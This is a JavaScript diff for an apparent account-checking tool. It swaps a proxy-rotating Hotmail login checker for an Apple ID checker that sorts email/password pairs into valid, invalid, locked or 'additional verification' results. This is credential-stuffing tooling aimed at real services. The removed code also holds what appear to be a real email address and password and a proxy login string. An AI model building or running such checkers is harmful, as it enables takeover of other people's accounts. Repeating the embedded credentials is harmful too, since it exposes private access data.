@@ -1,50 +1,33 @@
-const HotmailClass = require('./hotmail');
+const { CHBMAppleID } = require('./ipv4');
+const MAX_RETRIES = 3;
+const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
-async function checkLoginHotmailWithRetry(email, password, listProxy) {
-  let retry = 0;
-  let proxies = Array.isArray(listProxy)
-    ? listProxy.filter(proxy => proxy && String(proxy).trim())
-    : [];
+function classifyAppleResult(result) {
+  if (result?.status !== 'checked') return {
+    status: 'unchecked', reason: result?.reason || 'network_or_service', retryable: result?.retryable === true
+  };
+  if (result.note === 'sai pass') return { status: 'invalid', reason: 'incorrect_credentials' };
+  if (result.note === 'successfully') return { status: 'valid', reason: 'authenticated' };
+  if (result.note === 'CHBM') return { status: 'valid', reason: 'additional_verification_required' };
+  if (result.note === 'locked') return { status: 'unchecked', reason: 'account_locked' };
+  return { status: 'unchecked', reason: 'unknown_response' };
+}
 
-  if (!proxies.length) {
-    proxies = [null];
-  }
-
-  while (retry < 3) {
-    try {
-      const proxyString = proxies[retry % proxies.length];
-      let proxy = proxyString;
-      if (proxyString) {
-        if (!proxyString.includes("http://")) {
-          proxy = `http://${proxyString}`;
-        }
-        if (proxyString.split(":").length === 4) {
-          const [host, port, username, password] =proxyString.split(':');
-          proxy = `http://${username}:${password}@${host}:${port}`;
-        }
-      }
-      const hotmail = new HotmailClass(proxy, email, password);
-      const { status } = await hotmail.Unlock();
-      if (status === 'success' || status === 'failed') {
-        let statusValue = status === 'success' ? 'valid' : 'invalid';
-        return { status: statusValue, email, password };
-      } else {
-        await new Promise(resolve => setTimeout(resolve, 2000));
-      }
-    } catch (error) {
-      await new Promise(resolve => setTimeout(resolve, 2000));
-      // Try the next proxy, same style as action.js.
+async function checkLoginAppleID(email, password, proxy, options = {}) {
+  const progress = options.retryState || {};
+  const shouldRetry = options.shouldRetry || (() => true);
+  progress.attempts ??= 0;
+  while (progress.attempts < 1 + MAX_RETRIES) {
+    if (progress.result?.retryable) {
+      if (!shouldRetry()) return { ...progress.result, deferred: true };
+      await delay(1000 * progress.attempts);
+      if (!shouldRetry()) return { ...progress.result, deferred: true };
     }
-    retry++;
+    progress.attempts++;
+    progress.result = classifyAppleResult(await CHBMAppleID(email, password, proxy || null));
+    if (!progress.result.retryable) return progress.result;
   }
-  return { status: 'unchecked', email, password };
+  return progress.result;
 }
 
-// (async () => {
-//   let a = await checkLoginHotmailWithRetry("tomatillo_86@hotmail.com", "VanBao55678@", ["gw.dataimpulse.com:823:0f601731bbfc77f2faea:84c168ea16712453"]);
-//   console.log(a);
-// })();
-
-module.exports = {
-  checkLoginHotmailWithRetry
-}
+module.exports = { checkLoginAppleID, classifyAppleResult };
